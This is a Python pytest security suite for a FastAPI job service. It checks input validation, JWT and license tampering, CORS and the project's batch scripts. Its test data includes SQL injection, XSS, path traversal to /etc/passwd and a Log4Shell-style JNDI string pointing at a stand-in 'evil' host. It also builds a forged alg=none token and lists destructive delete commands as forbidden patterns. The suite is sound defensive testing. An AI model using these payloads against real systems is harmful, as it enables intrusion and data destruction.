"""Security tests — input validation, injection, oversized payloads, token tampering."""
from __future__ import annotations
import importlib
import json
from pathlib import Path

import pytest
from fastapi.testclient import TestClient


@pytest.fixture
def client(tmp_path, monkeypatch):
    monkeypatch.setenv("SYNCFORGE_STORAGE", str(tmp_path / "storage"))
    monkeypatch.setenv("SYNCFORGE_JWT_SECRET", "sec-secret")
    monkeypatch.setenv("LICENSE_SECRET", "sec-license")
    import app.main as main
    importlib.reload(main)
    main.JOBS.clear()
    async def noop(jid, req):
        from app.main import publish, JOBS
        JOBS[jid].status = "done"
        await publish(jid, {"event": "done", "result": {"ok": True}})
    monkeypatch.setattr(main, "_run_job", noop)
    with TestClient(main.app) as c:
        yield c, main


# ─── Input validation: malicious titles must not break the pipeline ─────

@pytest.mark.parametrize("title", [
    "'; DROP TABLE jobs; --",          # SQL injection (we have no SQL, but still safe)
    "<script>alert(1)</script>",        # XSS (rendered? must be escaped client-side)
    "../../../etc/passwd",              # Path traversal
    "..\\..\\..\\windows\\system32",    # Windows path traversal
    "\x00\x01\x02null bytes",           # Control chars
    "A" * 10_000,                       # Huge title
    "\n\n\nmultiline\n\n\n",           # Newlines
    "🚀🔥💀" * 100,                     # Unicode emoji flood
    "/api/jobs",                        # URL-as-title
    "${jndi:ldap://evil/x}",            # Log4Shell-style
])
def test_malicious_title_accepted_without_crash(client, title):
    c, _ = client
    r = c.post("/api/jobs", json={"title": title})
    # Either accepted (and sanitized downstream) or rejected with 4xx — but never 5xx
    assert r.status_code < 500, f"crashed on title: {title!r}"


def test_oversized_json_body_does_not_crash(client):
    """A 5 MB JSON body — FastAPI should reject cleanly, not crash."""
    c, _ = client
    big = "x" * 5_000_000
    r = c.post("/api/jobs", json={"title": big, "theme": big})
    # Should either accept-and-truncate or 4xx, never 5xx
    assert r.status_code < 500


def test_missing_required_field_returns_422(client):
    c, _ = client
    r = c.post("/api/jobs", json={})  # no title
    assert r.status_code == 422


def test_invalid_field_types_return_422(client):
    c, _ = client
    r = c.post("/api/jobs", json={"title": 12345, "target_sec": "not-a-number"})
    assert r.status_code == 422


# ─── Auth tampering ─────────────────────────────────────────────────────

def test_missing_bearer_prefix_rejected(client):
    """Authorization header without 'Bearer ' prefix → 401."""
    c, _ = client
    r = c.get("/api/auth/me",
               headers={"Authorization": "some-raw-token"})
    assert r.status_code == 401


def test_jwt_alg_none_attack_rejected(client):
    """Forged token with alg=none (classic JWT vuln) must be rejected."""
    import base64
    c, _ = client
    # Standard alg=none attack: header.payload.empty_sig
    header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({"sub": "attacker", "plan": "team",
                    "exp": 9999999999}).encode()).rstrip(b"=").decode()
    forged = f"{header}.{payload}."
    r = c.get("/api/auth/me", headers={"Authorization": f"Bearer {forged}"})
    assert r.status_code == 401


def test_garbage_bearer_token_rejected(client):
    c, _ = client
    for bad in ["random.garbage.string", "a.b.c", "", "..", "Bearer Bearer x.y.z"]:
        r = c.get("/api/auth/me", headers={"Authorization": f"Bearer {bad}"})
        assert r.status_code == 401


def test_license_random_string_rejected():
    from app.core.license import verify_license
    for bad in ["random", "SF--free--0-x", "AAAAAAAA"]:
        lic = verify_license(bad)
        assert lic.valid is False


# ─── Brute-force protection (timing-safe compare) ───────────────────────

def test_password_compare_uses_constant_time(tmp_path):
    """User.verify() must use HMAC-equal comparison (no early exit on mismatch)."""
    from app.auth.users import UserStore
    import inspect, app.auth.users as mod
    src = inspect.getsource(mod._hash_password)
    # Should call hashlib.pbkdf2_hmac (not simple ==)
    assert "pbkdf2_hmac" in src
    # And the verify path compares full hex digests
    src_v = inspect.getsource(UserStore.verify)
    assert "password_hash" in src_v


# ─── Path traversal in download ─────────────────────────────────────────

def test_no_path_traversal_in_dist_files():
    """Confirm install.bat and build.bat don't accidentally accept user-supplied paths
    or recurse outside the install dir."""
    root = Path(__file__).resolve().parents[1]
    for bat in (root / "dist" / "install.bat",
                root / "dist" / "build.bat"):
        text = bat.read_text(encoding="utf-8", errors="ignore")
        # No %1 / %~1 (user-controlled arguments) used as paths
        assert "%1\\" not in text and "%1/" not in text
        # No dangerous wildcards like *.* at filesystem root
        assert "del /S /Q C:" not in text
        assert "rmdir /S C:" not in text


# ─── Anti-CSRF posture ──────────────────────────────────────────────────

def test_cors_only_allows_known_origin(client):
    """Preflight from arbitrary origin should NOT echo the origin back."""
    c, _ = client
    r = c.options("/api/jobs",
                   headers={"Origin": "http://evil.example.com",
                            "Access-Control-Request-Method": "POST"})
    # Either rejected (no header) or echoes only the configured origin
    echoed = r.headers.get("access-control-allow-origin", "")
    assert echoed != "http://evil.example.com"


# ─── License signature secret separation ────────────────────────────────

def test_license_signed_with_wrong_secret_rejected(monkeypatch):
    """Issue with secret A, verify with secret B → invalid."""
    import importlib
    from app.core.license import issue_license, verify_license
    key = issue_license("pro", "user", expires_at=0, secret="SECRET-A")
    lic = verify_license(key, secret="SECRET-B")
    assert lic.valid is False


def test_audit_does_not_log_password():
    """Make sure no AUDIT.record call ever passes a password field as metadata."""
    import inspect, app.main as main
    src = inspect.getsource(main)
    # Heuristic scan: AUDIT.record near password-bearing dicts
    # If we ever did `metadata={"password": ...}` this test would fail
    bad_lines = [ln for ln in src.splitlines()
                  if "AUDIT.record" in ln or "audit.record" in ln]
    for ln in bad_lines:
        assert "password" not in ln.lower()
